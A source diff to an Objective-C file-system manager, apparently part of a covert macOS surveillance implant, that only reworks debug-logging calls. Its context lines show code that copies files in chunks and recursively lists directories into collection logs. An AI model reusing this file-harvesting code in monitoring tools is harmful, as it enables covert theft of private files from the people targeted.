@@ -13,9 +13,11 @@
 
 #import "RCSMLogManager.h"
 
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
+
 #define FS_MAX_DOWNLOAD_FILE_SIZE (100 * 1024 * 1024)
 #define FS_MAX_UPLOAD_CHUNK_SIZE  (25 *  1024 * 1024)
-//#define DEBUG_FS_MANAGER
 
 
 @interface RCSMFileSystemManager (private)
@@ -32,10 +34,6 @@
                                isDirectory: (BOOL)isDirectory
                                    isEmpty: (BOOL)isEmpty
 {
-#ifdef DEBUG_FS_MANAGER
-  infoLog(ME, @"");
-#endif
-  
   NSMutableData *logData        = [[NSMutableData alloc] init];
   NSMutableData *rawHeader      = [[NSMutableData alloc]
                                    initWithLength: sizeof(fileSystemHeader)];
@@ -88,8 +86,7 @@
 - (BOOL)createFile: (NSString *)aFileName withData: (NSData *)aFileData
 {
 #ifdef DEBUG_FS_MANAGER
-  infoLog(ME, @"");
-  infoLog(ME, @"filename: %@", aFileName);
+  infoLog(@"filename: %@", aFileName);
 #endif
   
   NSString *filePath = [NSString stringWithFormat: @"%@/%@",
@@ -99,7 +96,7 @@
   if ([aFileData length] > FS_MAX_DOWNLOAD_FILE_SIZE)
     {
 #ifdef DEBUG_FS_MANAGER
-      errorLog(ME, @"file too big! (>%d)", FS_MAX_DOWNLOAD_FILE_SIZE);
+      errorLog(@"file too big! (>%d)", FS_MAX_DOWNLOAD_FILE_SIZE);
 #endif
       
       return NO;
@@ -111,10 +108,6 @@
 
 - (BOOL)logFileAtPath: (NSString *)aFilePath
 {
-#ifdef DEBUG_FS_MANAGER
-  infoLog(ME, @"");
-#endif
-  
   logDownloadHeader *additionalHeader;
   
   u_int numOfTotalChunks  = 1;
@@ -131,7 +124,7 @@
   NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aFilePath]; 
   
 #ifdef DEBUG_FS_MANAGER
-  debugLog(ME, @"numOfTotalChunks: %d", numOfTotalChunks);
+  warnLog(@"numOfTotalChunks: %d", numOfTotalChunks);
 #endif
   
   //
@@ -158,7 +151,7 @@
         }
       
 #ifdef DEBUG_FS_MANAGER
-      debugLog(ME, @"%@ with size (%d)", fileName, fileSize);
+      warnLog(@"%@ with size (%d)", fileName, fileSize);
 #endif
     
       currentChunkSize = fileSize;
@@ -168,7 +161,7 @@
         }
     
 #ifdef DEBUG_FS_MANAGER
-      debugLog(ME, @"currentChunkSize: %d", currentChunkSize);
+      warnLog(@"currentChunkSize: %d", currentChunkSize);
 #endif
       
       fileSize -= currentChunkSize;
@@ -193,7 +186,7 @@
       @catch (NSException *e)
         {
 #ifdef DEBUG_FS_MANAGER
-          errorLog(ME, @"Exception on replaceBytesInRange makerange");
+          errorLog(@"Exception on replaceBytesInRange makerange");
 #endif
           [fileName release];
           [innerPool release];
@@ -207,7 +200,7 @@
       if (success == FALSE)
         {
 #ifdef DEBUG_FS_MANAGER
-          errorLog(ME, @"createLog failed");
+          errorLog(@"createLog failed");
 #endif
           
           [fileName release];
@@ -220,7 +213,7 @@
       if ((_fileData = [fileHandle readDataOfLength: currentChunkSize]) == nil)
         {
 #ifdef DEBUG_FS_MANAGER
-          errorLog(ME, @"Error while reading file");
+          errorLog(@"Error while reading file");
 #endif
           
           [fileName release];
@@ -235,7 +228,7 @@
                            withLogID: 0] == FALSE)
         {
 #ifdef DEBUG_FS_MANAGER
-          errorLog(ME, @"Error while writing data to log");
+          errorLog(@"Error while writing data to log");
 #endif
           
           [fileData release];
@@ -248,7 +241,7 @@
                            withLogID: 0] == FALSE)
         {
 #ifdef DEBUG_FS_MANAGER
-          errorLog(ME, @"Error while closing activeLog");
+          errorLog(@"Error while closing activeLog");
 #endif
           [fileData release];
           [fileName release];
@@ -269,14 +262,10 @@
 
 - (BOOL)logDirContent: (NSString *)aDirPath withDepth: (uint32_t)aDepth
 {
-#ifdef DEBUG_FS_MANAGER
-  infoLog(ME, @"");
-#endif
-  
   if (aDepth == 0)
     {
 #ifdef DEBUG_FS_MANAGER
-      infoLog(ME, @"depth is zero, returning");
+      infoLog(@"depth is zero, returning");
 #endif
       return TRUE;
     }
@@ -311,7 +300,7 @@
   if (isDir == TRUE)
     {
 #ifdef DEBUG_FS_MANAGER
-      infoLog(ME, @"is dir: %@", aDirPath);
+      infoLog(@"is dir: %@", aDirPath);
 #endif
       
       BOOL success = [logManager createLog: LOG_FILESYSTEM
@@ -321,7 +310,7 @@
       if (success == FALSE)
         {
 #ifdef DEBUG_FS_MANAGER
-          errorLog(ME, @"createLog failed");
+          errorLog(@"createLog failed");
 #endif
           
           [outerPool release];
@@ -340,7 +329,7 @@
                            withLogID: 0] == FALSE)
         {
 #ifdef DEBUG_FS_MANAGER
-          errorLog(ME, @"writeDataToLog firstLogData failed");
+          errorLog(@"writeDataToLog firstLogData failed");
 #endif
           
           [outerPool release];
@@ -348,7 +337,7 @@
         }
       
 #ifdef DEBUG_FS_MANAGER
-      infoLog(ME, @"entries (%d)", filesCount);
+      infoLog(@"entries (%d)", filesCount);
 #endif
       
       for (i = 0; i < filesCount; i++)
@@ -369,7 +358,7 @@
           if (isDir == TRUE)
             {
 #ifdef DEBUG_FS_MANAGER
-              infoLog(ME, @"is subdir: %@", filePath);
+              infoLog(@"is subdir: %@", filePath);
 #endif
               NSArray *subDirContent = [_fileManager contentsOfDirectoryAtPath: filePath
                                                                          error: nil];
@@ -378,14 +367,14 @@
               if ([subDirContent count] > 0)
                 {
 #ifdef DEBUG_FS_MANAGER
-                  infoLog(ME, @"need to recurse on %@", filePath);
+                  infoLog(@"need to recurse on %@", filePath);
 #endif
                   recurse = 1;
                 }
               else
                 {
 #ifdef DEBUG_FS_MANAGER
-                  warnLog(ME, @"is empty %@", filePath);
+                  warnLog(@"is empty %@", filePath);
 #endif
                   isEmpty = YES;
                 }
@@ -400,7 +389,7 @@
                                withLogID: 0] == FALSE)
             {
 #ifdef DEBUG_FS_MANAGER
-              errorLog(ME, @"writeDataToLog failed");
+              errorLog(@"writeDataToLog failed");
 #endif
               
               [innerPool release];
@@ -409,13 +398,13 @@
             }
             
 #ifdef DEBUG_FS_MANAGER
-          infoLog(ME, @"%@ logged", filePath);
+          infoLog(@"%@ logged", filePath);
 #endif
           
           if (recurse == 1)
             {
 #ifdef DEBUG_FS_MANAGER
-              infoLog(ME, @"recursing on %@", filePath);
+              infoLog(@"recursing on %@", filePath);
 #endif
               
               [filePath appendString: @"/"];
@@ -429,7 +418,7 @@
   else
     {
 #ifdef DEBUG_FS_MANAGER
-      errorLog(ME, @"Path not found or not a dir (%@)", aDirPath);
+      errorLog(@"Path not found or not a dir (%@)", aDirPath);
 #endif
       
       [outerPool release];
@@ -440,7 +429,7 @@
                        withLogID: 0] == FALSE)
     {
 #ifdef DEBUG_FS_MANAGER
-      errorLog(ME, @"closeActiveLog failed");
+      errorLog(@"closeActiveLog failed");
 #endif
       
       [outerPool release];
@@ -453,10 +442,6 @@
 
 - (NSArray *)searchFilesOnHD: (NSString *)aFileMask
 {
-#ifdef DEBUG_FS_MANAGER
-  infoLog(ME, @"");
-#endif
-  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   NSFileManager *_fileManager = [NSFileManager defaultManager];
